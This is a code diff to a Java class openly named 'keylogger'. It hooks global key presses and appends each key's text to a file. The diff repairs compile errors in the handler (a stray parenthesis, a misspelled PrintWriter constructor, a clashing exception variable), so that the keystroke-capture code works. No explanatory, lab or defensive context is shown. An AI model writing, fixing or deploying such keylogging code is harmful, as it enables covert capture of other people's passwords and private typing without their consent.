@@ -23,15 +23,15 @@ public class keylogger implements NativeKeyListener {
 
     /* Key Pressed */
     public void nativeKeyPressed(NativeKeyEvent e) {
-        String text = NativeKeyEvent.getKeyText(e.getKeyCode()));
+        String text = NativeKeyEvent.getKeyText(e.getKeyCode());
 
-        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter w = newPrintWrite(os)) {
+        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter w = new PrintWriter(os)) {
             if (text.length() > 1) {
                 w.print("[" + text + "]");
             } else {
                 w.print(text);
             }
-        } catch (IOException e) {
+        } catch (IOException exp) {
             System.exit(1);
         }
     }
